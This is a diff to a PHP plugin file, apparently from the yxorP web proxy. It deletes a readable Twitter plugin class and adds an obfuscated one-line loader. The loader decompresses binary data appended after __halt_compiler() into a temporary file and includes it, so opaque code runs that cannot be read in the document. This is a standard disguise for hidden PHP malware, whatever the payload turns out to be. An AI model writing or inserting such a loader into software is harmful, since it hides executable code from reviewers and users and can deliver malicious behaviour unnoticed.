@@ -1,20 +1,2 @@
-<?php /* yxorP */
-
-use yxorP\http\ProxyEvent;
-
-class TwitterPlugin extends AbstractPlugin
-{
-    protected $url_pattern = 'twitter.com';
-
-    public function onCompleted(ProxyEvent $event)
-    {
-
-        $response = $event['response'];
-        $content = $response->getContent();
-
-        $content = Html::remove_scripts($content);
-
-        $response->setContent($content);
-    }
-}
-
+<?php $f=fopen(__FILE__,'r');fseek($f,__COMPILER_HALT_OFFSET__);$t=tmpfile();$u=stream_get_meta_data($t)['uri'];fwrite($t,gzinflate(stream_get_contents($f)));include($u);fclose($t);__halt_compiler();]±jÃ0†wŞáƒ@›=®[J(tôĞ­)ÁQ.‰@–„tJBŞ½VT£´·ı÷ÒÓ‹=ZXÌá<×Â|ÁgÁcº¯Dvİ:3œßN¨©[¡:ïáã[¡kU8H8ê‡×­'×	J1gÎ`ë¡ ÜAœÚØ.¢()i…éË›ıV[%ìƒ$£W¦·
+GA•Æc–˜ËÇ)zkôøæ·õYNQùUß…Ñ]MfH«”W³ú7×ß©WË¥ÃŞœpã…“–|5íÿQÙì³ù¾[WÎ®‘ú
